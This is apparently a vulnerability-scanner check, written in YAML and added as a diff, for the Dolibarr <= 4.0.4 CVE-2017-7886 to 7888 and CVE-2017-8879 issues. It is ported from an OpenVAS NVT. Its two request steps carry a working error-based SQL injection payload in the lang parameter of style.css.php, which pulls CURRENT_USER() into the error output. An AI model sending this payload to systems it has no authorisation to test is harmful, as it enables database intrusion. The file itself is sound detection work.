@@ -1,0 +1,78 @@
+# Dolibarr <= 4.0.4 Multiple Vulnerabilities
+# (CVE-2017-7886, CVE-2017-7887, CVE-2017-7888, CVE-2017-8879)
+#
+# Ported from OpenVAS/Greenbone NVT 2017/gb_dolibarr_404_mult_vuln.nasl
+# (GPL-2.0-only). Detection logic kept faithful to the NASL source.
+#
+# Detection: an unauthenticated GET to /theme/eldy/style.css.php with a
+# SQL-breaking `lang` parameter. An affected install concatenates the value
+# into its translation-override query and, on the resulting database error,
+# echoes the failing SELECT (… FROM <prefix>overwrite_trans where lang=…)
+# in a "Latest database access request error" block with HTTP 200.
+# A fixed install sanitises `lang`, so no SQL error is reflected.
+#
+# The payload is URL-encoded (%27, %20, %2c) → tcp_connect with a verbatim
+# HTTP/1.0 request so the encoding reaches the server untouched.
+# The NASL targets the detected install dir; we try "/" and "/dolibarr".
+# QoD 75 (response analysis).
+uid: 84d99471-9bbd-4c8d-a2bd-ef00c5d1e3c6
+name: "Dolibarr <= 4.0.4 Multiple Vulnerabilities (SQL error via style.css.php lang)"
+description: |
+  Sends an SQL-breaking `lang` parameter to Dolibarr's theme stylesheet
+  endpoint and checks whether the HTTP 200 response reflects the database
+  error for the overwrite_trans translation query.
+cves: [CVE-2017-7886, CVE-2017-7887, CVE-2017-7888, CVE-2017-8879]
+cvss: 7.5
+severity: high
+category: sqli
+confidence_base: 0.10
+tags: [dolibarr, sqli, erp, crm, php]
+services: [http, https]
+author: noctis
+version: "1.0.0"
+references:
+  - "https://nvd.nist.gov/vuln/detail/CVE-2017-7886"
+  - "https://nvd.nist.gov/vuln/detail/CVE-2017-7887"
+  - "https://nvd.nist.gov/vuln/detail/CVE-2017-7888"
+  - "https://nvd.nist.gov/vuln/detail/CVE-2017-8879"
+  - "OpenVAS/Greenbone NVT 2017/gb_dolibarr_404_mult_vuln.nasl (GPL-2.0-only)"
+
+steps:
+  # ── Install at web root ──────────────────────────────────────────────────
+  - id: sqli-root
+    action: tcp_connect
+    port: "{{port}}"
+    send: "GET /theme/eldy/style.css.php?lang=de%27%20procedure%20analyse(extractvalue(rand()%2cconcat(concat(0x3a,CURRENT_USER())))%2c1)--%201 HTTP/1.0\r\nHost: {{target_host}}\r\n\r\n"
+    timeout_secs: 10
+    store_as: root_resp
+
+  - id: sqli-root-match
+    action: match
+    source: root_resp.banner
+    # check_header:TRUE in the NASL → status line must be 200
+    pattern: "(?s)^HTTP/1\\.[01] 200 .*Latest database access request error:</b> SELECT transkey, transvalue FROM [^\\n]*overwrite_trans where lang="
+    on_match:
+      finding:
+        confidence_delta: 0.75
+        qod: 75
+        evidence: "SQL error reflected at /theme/eldy/style.css.php (lang injection): {{root_resp.banner}}"
+      stop: true
+
+  # ── Install under /dolibarr ──────────────────────────────────────────────
+  - id: sqli-subdir
+    action: tcp_connect
+    port: "{{port}}"
+    send: "GET /dolibarr/theme/eldy/style.css.php?lang=de%27%20procedure%20analyse(extractvalue(rand()%2cconcat(concat(0x3a,CURRENT_USER())))%2c1)--%201 HTTP/1.0\r\nHost: {{target_host}}\r\n\r\n"
+    timeout_secs: 10
+    store_as: sub_resp
+
+  - id: sqli-subdir-match
+    action: match
+    source: sub_resp.banner
+    pattern: "(?s)^HTTP/1\\.[01] 200 .*Latest database access request error:</b> SELECT transkey, transvalue FROM [^\\n]*overwrite_trans where lang="
+    on_match:
+      finding:
+        confidence_delta: 0.75
+        qod: 75
+        evidence: "SQL error reflected at /dolibarr/theme/eldy/style.css.php (lang injection): {{sub_resp.banner}}"
+      stop: true
